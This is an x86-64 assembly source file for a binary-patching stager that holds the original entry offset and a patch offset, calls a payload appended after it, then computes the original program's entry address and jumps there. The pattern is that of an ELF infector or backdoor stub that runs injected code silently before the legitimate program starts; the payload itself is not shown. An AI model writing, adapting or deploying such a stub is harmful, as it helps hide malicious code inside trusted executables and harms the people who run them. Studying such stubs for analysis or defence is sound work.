.intel_syntax noprefix
.global _start

_start:
    jmp past

e_entry:
.long 0

patch_ofs:
.long 0

past:
    call payload               /* Call the payload */
    mov eax, [rip + e_entry]   /* Get offset of real entry  */
    mov ebx, [rip + patch_ofs] /* Get offset of the stager */
    sub rbx, rax               /* Compute the delta between the stager and the real entry offsets */
    lea rcx, [rip + _start]    /* Get vaddr of the stager */
    sub rcx, rbx               /* Subtract the delta from vaddr of the stager to get the vaddr of real entry */
    jmp rcx                    /* Jump to real entry */

payload:
/* Payload blob is appended to the end of this blob */
